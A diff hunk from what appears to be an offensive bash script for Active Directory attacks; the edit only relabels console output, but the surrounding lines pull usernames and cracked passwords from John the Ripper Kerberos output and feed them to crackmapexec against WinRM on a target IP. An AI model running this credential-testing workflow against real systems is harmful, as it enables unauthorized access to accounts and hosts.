@@ -99,9 +99,9 @@ if [ -n "$check_users" ];then
 		cat out_john | grep \$krb | cut -d$ -f 4 | cut -d@ -f 1 | uniq  > user.txt
 
 		user=$(cat user.txt)
-		echo -e "${RED}[-] $user ${ENDCOLOR}"
+		echo -e "${GREEN}[+] user :$user ${ENDCOLOR}"
 		pass=$(cat pass.txt)
-		echo -e "${RED}[-] $pass ${ENDCOLOR}"
+		echo -e "${GREEN}[+] password :$pass ${ENDCOLOR}"
 		if [ -n "$pass" ];then
 			mkdir cme_user
 			crackmapexec winrm $ip -u user.txt -p pass.txt --no-bruteforce --continue-on-succes > ./cme_user/winrm
